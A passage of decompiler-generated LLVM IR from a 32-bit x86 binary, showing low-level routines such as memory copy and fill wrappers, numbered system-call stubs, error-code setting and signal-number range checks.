  br i1 %v1_8051e8b, label %dec_label_pc_8051ea3, label %dec_label_pc_8051e8d

dec_label_pc_8051e8d:                             ; preds = %dec_label_pc_8051e7b, %dec_label_pc_8051e67
  %v0_8051e8d = load i32, i32* %stack_var_-124, align 4
  %v1_8051e8d = call i32 @function_8051fb9(i32 %v0_8051e8d)
  store i32 %v1_8051e8d, i32* %eax.global-to-local, align 4
  store i32 %v1_8051e8d, i32* @ebx, align 4
  %v1_8051e97 = inttoptr i32 %v1_8051e8d to i32*
  %v2_8051e97 = load i32, i32* %v1_8051e97, align 4
  %v0_8051e99 = load i32, i32* @edi, align 4
  store i32 %v0_8051e99, i32* %stack_var_-124, align 4
  %v1_8051e9a = call i32 @function_8051a81(i32 %v0_8051e99)
  store i32 %v1_8051e9a, i32* %eax.global-to-local, align 4
  %v1_8051e9f = load i32, i32* @ebx, align 4
  %v2_8051e9f = inttoptr i32 %v1_8051e9f to i32*
  store i32 %v2_8051e97, i32* %v2_8051e9f, align 4
  br label %dec_label_pc_8051f18

dec_label_pc_8051ea3:                             ; preds = %dec_label_pc_8051e7b
  store i32 48, i32* %stack_var_-124, align 4
  %v1_8051ea8 = call i32 @function_8052414(i32 48)
  store i32 %v1_8051ea8, i32* %eax.global-to-local, align 4
  store i32 %v1_8051ea8, i32* @ebx, align 4
  %v1_8051eb2 = icmp eq i32 %v1_8051ea8, 0
  br i1 %v1_8051eb2, label %dec_label_pc_8051f04, label %dec_label_pc_8051eb6

dec_label_pc_8051eb6:                             ; preds = %dec_label_pc_8051ea3
  %v0_8051eb6 = load i32, i32* @edi, align 4
  %v2_8051eb6 = inttoptr i32 %v1_8051ea8 to i32*
  store i32 %v0_8051eb6, i32* %v2_8051eb6, align 4
  %v1_8051eb8 = add i32 %v1_8051ea8, 16
  %v2_8051eb8 = inttoptr i32 %v1_8051eb8 to i32*
  store i32 0, i32* %v2_8051eb8, align 4
  %v1_8051ebf = add i32 %v1_8051ea8, 8
  %v2_8051ebf = inttoptr i32 %v1_8051ebf to i32*
  store i32 0, i32* %v2_8051ebf, align 4
  %v1_8051ec6 = add i32 %v1_8051ea8, 4
  %v2_8051ec6 = inttoptr i32 %v1_8051ec6 to i32*
  store i32 0, i32* %v2_8051ec6, align 4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v1_8051ed1 = load i32, i32* @ebx, align 4
  %v2_8051ed1 = add i32 %v1_8051ed1, 20
  %v3_8051ed1 = inttoptr i32 %v2_8051ed1 to i32*
  store i32 %tmp, i32* %v3_8051ed1, align 4
  %v0_8051ed4 = load i32, i32* %eax.global-to-local, align 4
  %v6_8051ed9 = icmp ugt i32 %v0_8051ed4, 511
  br i1 %v6_8051ed9, label %dec_label_pc_8051ee2, label %dec_label_pc_8051edb

dec_label_pc_8051edb:                             ; preds = %dec_label_pc_8051eb6
  %v0_8051edb = load i32, i32* @ebx, align 4
  %v1_8051edb = add i32 %v0_8051edb, 20
  %v2_8051edb = inttoptr i32 %v1_8051edb to i32*
  store i32 512, i32* %v2_8051edb, align 4
  br label %dec_label_pc_8051ee2

dec_label_pc_8051ee2:                             ; preds = %dec_label_pc_8051eb6, %dec_label_pc_8051edb
  %v0_8051ee4 = load i32, i32* @ebx, align 4
  %v1_8051ee4 = add i32 %v0_8051ee4, 20
  %v2_8051ee4 = inttoptr i32 %v1_8051ee4 to i32*
  %v3_8051ee4 = load i32, i32* %v2_8051ee4, align 4
  store i32 1, i32* %stack_var_-124, align 4
  %v3_8051ee9 = call i32 @function_8052b88(i64 1, i32 %v3_8051ee4)
  store i32 %v3_8051ee9, i32* %eax.global-to-local, align 4
  %v1_8051ef1 = load i32, i32* @ebx, align 4
  %v2_8051ef1 = add i32 %v1_8051ef1, 12
  %v3_8051ef1 = inttoptr i32 %v2_8051ef1 to i32*
  store i32 %v3_8051ee9, i32* %v3_8051ef1, align 4
  %v1_8051ef4 = icmp eq i32 %v3_8051ee9, 0
  %v1_8051ef6 = icmp eq i1 %v1_8051ef4, false
  br i1 %v1_8051ef6, label %dec_label_pc_8051f1c, label %dec_label_pc_8051ef8

dec_label_pc_8051ef8:                             ; preds = %dec_label_pc_8051ee2
  %v0_8051efb = load i32, i32* @ebx, align 4
  store i32 %v0_8051efb, i32* %stack_var_-124, align 4
  %v1_8051efc = call i32 @function_80531d9(i32 %v0_8051efb)
  store i32 %v1_8051efc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051f04

dec_label_pc_8051f04:                             ; preds = %dec_label_pc_8051ea3, %dec_label_pc_8051ef8
  %v0_8051f07 = load i32, i32* @edi, align 4
  store i32 %v0_8051f07, i32* %stack_var_-124, align 4
  %v1_8051f08 = call i32 @function_8051a81(i32 %v0_8051f07)
  store i32 %v1_8051f08, i32* %eax.global-to-local, align 4
  %v1_8051f0d = call i32 @function_8051fb9(i32 %v0_8051f07)
  store i32 %v1_8051f0d, i32* %eax.global-to-local, align 4
  %v1_8051f12 = inttoptr i32 %v1_8051f0d to i32*
  store i32 12, i32* %v1_8051f12, align 4
  br label %dec_label_pc_8051f18

dec_label_pc_8051f18:                             ; preds = %dec_label_pc_8051e8d, %dec_label_pc_8051f04
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8051f29

dec_label_pc_8051f1c:                             ; preds = %dec_label_pc_8051ee2
  %v0_8051f1e = load i32, i32* @ebx, align 4
  %v1_8051f1e = add i32 %v0_8051f1e, 24
  store i32 %v1_8051f1e, i32* %eax.global-to-local, align 4
  store i32 %v1_8051f1e, i32* %stack_var_-124, align 4
  %v1_8051f24 = call i32 @function_805393d(i32 %v1_8051f1e)
  store i32 %v1_8051f24, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051f29

dec_label_pc_8051f29:                             ; preds = %dec_label_pc_8051f18, %dec_label_pc_8051f1c
  %v2_8051f31.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8051f2c

dec_label_pc_8051f2c:                             ; preds = %dec_label_pc_8051e44, %dec_label_pc_8051f29
  %v2_8051f31 = phi i32 [ %v0_8051e46, %dec_label_pc_8051e44 ], [ %v2_8051f31.pre, %dec_label_pc_8051f29 ]
  %v0_8051f2f = load i32, i32* @ebx, align 4
  store i32 %v0_8051f2f, i32* %eax.global-to-local, align 4
  store i32 %v2_8051f31, i32* @ebx, align 4
  store i32 %v0_8051e44, i32* @edi, align 4
  ret i32 %v0_8051f2f

; uselistorder directives
  uselistorder i32 %v3_8051ee9, { 1, 0, 2 }
  uselistorder i32 %v1_8051ea8, { 2, 3, 5, 4, 1, 0, 6 }
  uselistorder i32 %v1_8051e8d, { 1, 0, 2 }
  uselistorder i32 %v3_8051e55, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-124, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 512, { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @function_8051a81, { 12, 11, 10, 20, 16, 19, 15, 18, 14, 17, 13, 3, 5, 9, 8, 7, 6, 4, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051f2c, { 1, 0 }
  uselistorder label %dec_label_pc_8051f29, { 1, 0 }
  uselistorder label %dec_label_pc_8051f18, { 1, 0 }
  uselistorder label %dec_label_pc_8051f04, { 1, 0 }
  uselistorder label %dec_label_pc_8051ee2, { 1, 0 }
}

define i32 @function_8051f35() local_unnamed_addr {
dec_label_pc_8051f35:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051f35 = load i32, i32* @esi, align 4
  %v0_8051f36 = load i32, i32* @ebx, align 4
  store i32 %v0_8051f36, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* @esi, align 4
  %v1_8051f3e = add i32 %tmp, 24
  store i32 %v1_8051f3e, i32* @ebx, align 4
  %v2_8051f47 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8051f47, i32* @eax, align 4
  %v2_8051f4c = call i32 @function_8053940(i32 %v2_8051f47, i32 134560061)
  %v0_8051f51 = load i32, i32* @ebx, align 4
  %v1_8051f54 = call i32 @function_805393d(i32 %v0_8051f51)
  br label %dec_label_pc_8051f5c

dec_label_pc_8051f5c:                             ; preds = %dec_label_pc_8051f87, %dec_label_pc_8051f35
  %v0_8051f5c = load i32, i32* @esi, align 4
  %v1_8051f5c = add i32 %v0_8051f5c, 8
  %v2_8051f5c = inttoptr i32 %v1_8051f5c to i32*
  %v3_8051f5c = load i32, i32* %v2_8051f5c, align 4
  %v2_8051f5f = add i32 %v0_8051f5c, 4
  %v3_8051f5f = inttoptr i32 %v2_8051f5f to i32*
  %v4_8051f5f = load i32, i32* %v3_8051f5f, align 4
  %v6_8051f62 = icmp ugt i32 %v3_8051f5c, %v4_8051f5f
  br i1 %v6_8051f62, label %dec_label_pc_8051f87, label %dec_label_pc_8051f64

dec_label_pc_8051f64:                             ; preds = %dec_label_pc_8051f5c
  %v0_8051f64 = load i32, i32* @edx, align 4
  %v1_8051f65 = add i32 %v0_8051f5c, 20
  %v2_8051f65 = inttoptr i32 %v1_8051f65 to i32*
  %v3_8051f65 = load i32, i32* %v2_8051f65, align 4
  %v1_8051f68 = add i32 %v0_8051f5c, 12
  %v2_8051f68 = inttoptr i32 %v1_8051f68 to i32*
  %v3_8051f68 = load i32, i32* %v2_8051f68, align 4
  %v1_8051f6b = inttoptr i32 %v0_8051f5c to i32*
  %v2_8051f6b = load i32, i32* %v1_8051f6b, align 4
  %v4_8051f6d = call i32 @function_8053d82(i32 %v2_8051f6b, i32 %v3_8051f68, i32 %v3_8051f65, i32 %v0_8051f64)
  %tmp12 = icmp slt i32 %v4_8051f6d, 1
  %tmp13 = icmp eq i1 %tmp12, false
  br i1 %tmp13, label %dec_label_pc_8051f7d, label %dec_label_pc_8051f79

dec_label_pc_8051f79:                             ; preds = %dec_label_pc_8051f64
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8051fa3

dec_label_pc_8051f7d:                             ; preds = %dec_label_pc_8051f64
  %v1_8051f7d = load i32, i32* @esi, align 4
  %v2_8051f7d = add i32 %v1_8051f7d, 8
  %v3_8051f7d = inttoptr i32 %v2_8051f7d to i32*
  store i32 %v4_8051f6d, i32* %v3_8051f7d, align 4
  %v0_8051f80 = load i32, i32* @esi, align 4
  %v1_8051f80 = add i32 %v0_8051f80, 4
  %v2_8051f80 = inttoptr i32 %v1_8051f80 to i32*
  store i32 0, i32* %v2_8051f80, align 4
  %v0_8051f87.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051f87

dec_label_pc_8051f87:                             ; preds = %dec_label_pc_8051f5c, %dec_label_pc_8051f7d
  %v1_8051f95 = phi i32 [ %v0_8051f5c, %dec_label_pc_8051f5c ], [ %v0_8051f87.pre, %dec_label_pc_8051f7d ]
  %v1_8051f87 = add i32 %v1_8051f95, 4
  %v2_8051f87 = inttoptr i32 %v1_8051f87 to i32*
  %v3_8051f87 = load i32, i32* %v2_8051f87, align 4
  %v2_8051f8c = add i32 %v1_8051f95, 12
  %v3_8051f8c = inttoptr i32 %v2_8051f8c to i32*
  %v4_8051f8c = load i32, i32* %v3_8051f8c, align 4
  %v5_8051f8c = add i32 %v4_8051f8c, %v3_8051f87
  store i32 %v5_8051f8c, i32* @ebx, align 4
  %v1_8051f8f = add i32 %v5_8051f8c, 8
  %v2_8051f8f = inttoptr i32 %v1_8051f8f to i16*
  %v3_8051f8f = load i16, i16* %v2_8051f8f, align 2
  %v4_8051f8f = zext i16 %v3_8051f8f to i32
  store i32 %v4_8051f8f, i32* @edx, align 4
  %v2_8051f93 = add i32 %v4_8051f8f, %v3_8051f87
  store i32 %v2_8051f93, i32* %v2_8051f87, align 4
  %v0_8051f98 = load i32, i32* @ebx, align 4
  %v1_8051f98 = add i32 %v0_8051f98, 4
  %v2_8051f98 = inttoptr i32 %v1_8051f98 to i32*
  %v3_8051f98 = load i32, i32* %v2_8051f98, align 4
  %v1_8051f9b = load i32, i32* @esi, align 4
  %v2_8051f9b = add i32 %v1_8051f9b, 16
  %v3_8051f9b = inttoptr i32 %v2_8051f9b to i32*
  store i32 %v3_8051f98, i32* %v3_8051f9b, align 4
  %v0_8051f9e = load i32, i32* @ebx, align 4
  %v1_8051f9e = inttoptr i32 %v0_8051f9e to i32*
  %v2_8051f9e = load i32, i32* %v1_8051f9e, align 4
  %v3_8051f9e = icmp eq i32 %v2_8051f9e, 0
  br i1 %v3_8051f9e, label %dec_label_pc_8051f5c, label %dec_label_pc_8051fa3.loopexit

dec_label_pc_8051fa3.loopexit:                    ; preds = %dec_label_pc_8051f87
  br label %dec_label_pc_8051fa3

dec_label_pc_8051fa3:                             ; preds = %dec_label_pc_8051fa3.loopexit, %dec_label_pc_8051f79
  store i32 %v2_8051f47, i32* @eax, align 4
  %v2_8051fac = call i32 @function_8053940(i32 %v2_8051f47, i32 1)
  %v0_8051fb1 = load i32, i32* @ebx, align 4
  %v2_8051fb6 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051fb6, i32* @ebx, align 4
  store i32 %v0_8051f35, i32* @esi, align 4
  ret i32 %v0_8051fb1

; uselistorder directives
  uselistorder i32 %v1_8051f95, { 1, 0 }
  uselistorder i32 %v0_8051f5c, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_8051f87, { 1, 0 }
}

define i32 @function_8051fb9(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051fb9:
  ret i32 ptrtoint (i32* @global_var_80561b4.198 to i32)
}

define i32 @function_8051fbf() local_unnamed_addr {
dec_label_pc_8051fbf:
  %tmp = call i64 @__decompiler_undefined_function_5()
  %stack_var_-16 = alloca i32, align 4
  %v1_8051fc7 = bitcast i32* %stack_var_-16 to %tms*
  %v2_8051fc7 = call i32 @function_8054157(%tms* %v1_8051fc7)
  %v4_8051fcc = trunc i64 %tmp to i32
  %v4_8051fd0 = load i32, i32* %stack_var_-16, align 4
  %v5_8051fd0 = add i32 %v4_8051fd0, %v4_8051fcc
  %v3_8051fd7 = mul i32 %v5_8051fd0, 10000
  %v1_8051fdd = and i32 %v3_8051fd7, 2147483632
  ret i32 %v1_8051fdd

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_8051fe3(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051fe3:
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8051fe4 = load i32, i32* @esi, align 4
  store i32 %v0_8051fe4, i32* %stack_var_-8, align 4
  %v4_8051fe5 = ptrtoint i8* %arg1 to i32
  %v9_8051ff1 = icmp ugt i8* %tmp3, %arg1
  %v1_8051ff3 = icmp eq i1 %v9_8051ff1, false
  br i1 %v1_8051ff3, label %dec_label_pc_8051ffb, label %dec_label_pc_8051ff5

dec_label_pc_8051ff5:                             ; preds = %dec_label_pc_8051fe3
  %v7_8051ff7 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %arg3)
  br label %dec_label_pc_8052007

dec_label_pc_8051ffb:                             ; preds = %dec_label_pc_8051fe3
  %v3_8051ffb = add i32 %arg2, -1
  %v4_8051ffb = add i32 %v3_8051ffb, %arg3
  %v5_8051ffb = inttoptr i32 %v4_8051ffb to i8*
  %v3_8051fff = add i32 %v4_8051fe5, -1
  %v4_8051fff = add i32 %v3_8051fff, %arg3
  %v5_8051fff = inttoptr i32 %v4_8051fff to i8*
  %v7_8052004 = call i8* @_memcpy(i8* %v5_8051fff, i8* %v5_8051ffb, i32 %arg3)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8052007

dec_label_pc_8052007:                             ; preds = %dec_label_pc_8051ff5, %dec_label_pc_8051ffb
  %v2_8052007 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052007, i32* @esi, align 4
  ret i32 %v4_8051fe5

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %arg3, { 1, 3, 2, 0 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052007, { 1, 0 }
}

define i32 @function_805200a(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805200a:
  %v0_805200a = load i32, i32* @edi, align 4
  %v4_8052013 = ptrtoint i8* %arg1 to i32
  %v5_8052017 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v0_805200a, i32* @edi, align 4
  ret i32 %v4_8052013

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @function_805201f(i32 %arg1) local_unnamed_addr {
dec_label_pc_805201f:
  %stack_var_-4 = alloca i32, align 4
  %v2_8052022 = ptrtoint i32* %stack_var_-4 to i32
  %v2_805202b = inttoptr i32 %arg1 to i8*
  %v3_805202b = call i32 @function_8054229(i8* %v2_805202b, i32 %v2_8052022)
  %v1_8052036 = icmp eq i32 %v3_805202b, 0
  br i1 %v1_8052036, label %dec_label_pc_805203e, label %dec_label_pc_805203a

dec_label_pc_805203a:                             ; preds = %dec_label_pc_805201f
  %v3_805203a = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805203e

dec_label_pc_805203e:                             ; preds = %dec_label_pc_805201f, %dec_label_pc_805203a
  %v0_805203e = phi i32 [ -1, %dec_label_pc_805201f ], [ %v3_805203a, %dec_label_pc_805203a ]
  ret i32 %v0_805203e

; uselistorder directives
  uselistorder label %dec_label_pc_805203e, { 1, 0 }
}

define i32 @function_8052044(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052044:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805205f = ptrtoint i32* %stack_var_-12 to i32
  %v2_8052066 = call i32 @function_8053c73(i32 5, i32 %v2_805205f)
  ret i32 %v2_8052066

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_805206f(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805206f:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805208a = ptrtoint i32* %stack_var_-12 to i32
  %v2_8052091 = call i32 @function_8053c73(i32 2, i32 %v2_805208a)
  ret i32 %v2_8052091

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_805209a(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805209a:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80520b5 = ptrtoint i32* %stack_var_-12 to i32
  %v2_80520bc = call i32 @function_8053c73(i32 3, i32 %v2_80520b5)
  ret i32 %v2_80520bc

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_80520c5(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80520c5:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80520e0 = ptrtoint i32* %stack_var_-12 to i32
  %v2_80520e7 = call i32 @function_8053c73(i32 6, i32 %v2_80520e0)
  ret i32 %v2_80520e7

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_80520f0() local_unnamed_addr {
dec_label_pc_80520f0:
  %stack_var_-20 = alloca i32, align 4
  %v2_805211b = ptrtoint i32* %stack_var_-20 to i32
  %v2_8052122 = call i32 @function_8053c73(i32 15, i32 %v2_805211b)
  ret i32 %v2_8052122
}

define i32 @function_805212b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_805212b:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_805213e = ptrtoint i32* %stack_var_-8 to i32
  %v2_8052145 = call i32 @function_8053c73(i32 4, i32 %v2_805213e)
  ret i32 %v2_8052145

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_805214e() local_unnamed_addr {
dec_label_pc_805214e:
  %stack_var_-16 = alloca i32, align 4
  %v2_8052171 = ptrtoint i32* %stack_var_-16 to i32
  %v2_8052178 = call i32 @function_8053c73(i32 10, i32 %v2_8052171)
  ret i32 %v2_8052178
}

define i32 @function_8052181() local_unnamed_addr {
dec_label_pc_8052181:
  %stack_var_-24 = alloca i32, align 4
  %v2_80521b4 = ptrtoint i32* %stack_var_-24 to i32
  %v2_80521bb = call i32 @function_8053c73(i32 12, i32 %v2_80521b4)
  ret i32 %v2_80521bb
}

define i32 @function_80521c4() local_unnamed_addr {
dec_label_pc_80521c4:
  %stack_var_-16 = alloca i32, align 4
  %v2_80521e7 = ptrtoint i32* %stack_var_-16 to i32
  %v2_80521ee = call i32 @function_8053c73(i32 9, i32 %v2_80521e7)
  ret i32 %v2_80521ee
}

define i32 @function_80521f7() local_unnamed_addr {
dec_label_pc_80521f7:
  %stack_var_-24 = alloca i32, align 4
  %v2_805222a = ptrtoint i32* %stack_var_-24 to i32
  %v2_8052231 = call i32 @function_8053c73(i32 11, i32 %v2_805222a)
  ret i32 %v2_8052231
}

define i32 @function_805223a(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_805223a:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8052265 = ptrtoint i32* %stack_var_-20 to i32
  %v2_805226c = call i32 @function_8053c73(i32 14, i32 %v2_8052265)
  ret i32 %v2_805226c

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_8052275(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052275:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8052290 = ptrtoint i32* %stack_var_-12 to i32
  %v2_8052297 = call i32 @function_8053c73(i32 1, i32 %v2_8052290)
  ret i32 %v2_8052297

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_8053c73, { 5, 4, 9, 3, 8, 2, 7, 1, 10, 0, 6, 11 }
}

define i32 @function_80522a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_80522a0:
  %v0_80522a3 = call i32 @function_8051ad5()
  %v0_80522a8 = load i32, i32* @edx, align 4
  %v4_80522af = call i32 @function_8051b60(i32 %v0_80522a3, i32 %arg1, i32 %v0_80522a8, i32 %v0_80522a8)
  ret i32 %v4_80522af

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @function_8051b60, { 0, 4, 3, 2, 1 }
  uselistorder i32 ()* @function_8051ad5, { 0, 2, 1 }
}

define i32 @function_80522b8(i32 %arg1) local_unnamed_addr {
dec_label_pc_80522b8:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_80522d0, label %dec_label_pc_80522c3

dec_label_pc_80522c3:                             ; preds = %dec_label_pc_80522b8
  %v1_80522c3 = add i32 %arg1, -64
  %v3_80522c3 = sub i32 63, %arg1
  %v4_80522c3 = and i32 %v3_80522c3, %arg1
  %v5_80522c3 = icmp slt i32 %v4_80522c3, 0
  %v6_80522c3 = icmp eq i32 %v1_80522c3, 0
  %v7_80522c3 = icmp slt i32 %v1_80522c3, 0
  %v3_80522c6 = icmp eq i1 %v7_80522c3, %v5_80522c3
  %v4_80522c6 = icmp eq i1 %v6_80522c3, false
  %v5_80522c6 = and i1 %v4_80522c6, %v3_80522c6
  br i1 %v5_80522c6, label %dec_label_pc_80522d0, label %dec_label_pc_80522c8

dec_label_pc_80522c8:                             ; preds = %dec_label_pc_80522c3
  %v4_80522cb = call i32 @function_80523ce(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_80522d0

dec_label_pc_80522d0:                             ; preds = %dec_label_pc_80522c3, %dec_label_pc_80522b8, %dec_label_pc_80522c8
  %v1_80522d0 = call i32 @function_8051fb9(i32 ptrtoint (i32* @0 to i32))
  %v1_80522d5 = inttoptr i32 %v1_80522d0 to i32*
  store i32 22, i32* %v1_80522d5, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_80522c3, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_80522d0, { 2, 0, 1 }
}

define i32 @function_80522e2(i32 %arg1) local_unnamed_addr {
dec_label_pc_80522e2:
  %v3_80522f0 = inttoptr i32 %arg1 to i8*
  %v4_80522f0 = call i32 @function_805200a(i8* %v3_80522f0, i32 0, i32 128)
  ret i32 0
}

define i32 @function_80522fb(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80522fb:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_80522fb = load i32, i32* @ebx, align 4
  %v15_80522fc = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_8052310 = icmp eq i32 %arg2, -1
  br i1 %v10_8052310, label %dec_label_pc_805231e, label %dec_label_pc_8052315

dec_label_pc_8052315:                             ; preds = %dec_label_pc_80522fb
  %tmp25 = icmp slt i32 %arg1, 1
  br i1 %tmp25, label %dec_label_pc_805231e, label %dec_label_pc_8052319

dec_label_pc_8052319:                             ; preds = %dec_label_pc_8052315
  %v7_805231c = icmp sgt i32 %arg1, 64
  br i1 %v7_805231c, label %dec_label_pc_805231e, label %dec_label_pc_8052339.lr.ph

dec_label_pc_805231e:                             ; preds = %dec_label_pc_8052319, %dec_label_pc_8052315, %dec_label_pc_80522fb
  %v1_805231e = call i32 @function_8051fb9(i32 %v0_80522fb)
  store i32 %v1_805231e, i32* %eax.global-to-local, align 4
  %v1_8052323 = inttoptr i32 %v1_805231e to i32*
  store i32 22, i32* %v1_8052323, align 4
  br label %dec_label_pc_805239f

dec_label_pc_8052339.lr.ph:                       ; preds = %dec_label_pc_8052319
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_805233927 = add i32 %v15_80522fc, 284
  %v5_805233928 = inttoptr i32 %v4_805233927 to i32*
  store i32 0, i32* %v5_805233928, align 4
  %v0_805234429 = load i32, i32* %eax.global-to-local, align 4
  %v1_805234430 = add i32 %v0_805234429, -1
  %v9_805234431 = icmp slt i32 %v1_805234430, 0
  store i32 %v1_805234430, i32* %eax.global-to-local, align 4
  %v1_805234532 = icmp eq i1 %v9_805234431, false
  br i1 %v1_805234532, label %dec_label_pc_8052339.dec_label_pc_8052339_crit_edge, label %dec_label_pc_8052347

dec_label_pc_8052339.dec_label_pc_8052339_crit_edge: ; preds = %dec_label_pc_8052339.lr.ph, %dec_label_pc_8052339.dec_label_pc_8052339_crit_edge
  %v1_805234433 = phi i32 [ %v1_8052344, %dec_label_pc_8052339.dec_label_pc_8052339_crit_edge ], [ %v1_805234430, %dec_label_pc_8052339.lr.ph ]
  %v0_8052339.pre = load i32, i32* @esp, align 4
  %v2_8052339 = mul i32 %v1_805234433, 4
  %v3_8052339 = add i32 %v0_8052339.pre, 160
  %v4_8052339 = add i32 %v3_8052339, %v2_8052339
  %v5_8052339 = inttoptr i32 %v4_8052339 to i32*
  store i32 0, i32* %v5_8052339, align 4
  %v0_8052344 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052344 = add i32 %v0_8052344, -1
  %v9_8052344 = icmp slt i32 %v1_8052344, 0
  store i32 %v1_8052344, i32* %eax.global-to-local, align 4
  %v1_8052345 = icmp eq i1 %v9_8052344, false
  br i1 %v1_8052345, label %dec_label_pc_8052339.dec_label_pc_8052339_crit_edge, label %dec_label_pc_8052347

dec_label_pc_8052347:                             ; preds = %dec_label_pc_8052339.dec_label_pc_8052339_crit_edge, %dec_label_pc_8052339.lr.ph
  %v0_8052347 = load i32, i32* @edx, align 4
  %v2_805234a = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_805234a, i32* %eax.global-to-local, align 4
  %v4_8052352 = call i32 @function_80523ce(i32 %v2_805234a, i32 %arg1, i32 %v0_8052347, i32 %v0_8052347)
  store i32 %v4_8052352, i32* %eax.global-to-local, align 4
  %v2_805235a = icmp slt i32 %v4_8052352, 0
  br i1 %v2_805235a, label %dec_label_pc_805239f, label %dec_label_pc_805235e

dec_label_pc_805235e:                             ; preds = %dec_label_pc_8052347
  %v4_8052366 = call i32 @function_80523aa(i32 ptrtoint (i32* @global_var_80567c0.199 to i32), i32 %arg1, i32 %v4_8052352, i32 %v4_8052352)
  %v2_805237f = ptrtoint i32* %stack_var_-284 to i32
  %v2_8052384 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8052384, i32* %eax.global-to-local, align 4
  %v4_805238d = call i32 @function_8053b7f(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_805237f)
  store i32 %v4_805238d, i32* %eax.global-to-local, align 4
  %v2_8052395 = icmp slt i32 %v4_805238d, 0
  br i1 %v2_8052395, label %dec_label_pc_805239f, label %dec_label_pc_8052399

dec_label_pc_8052399:                             ; preds = %dec_label_pc_805235e
  %v3_8052399 = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_80523a2

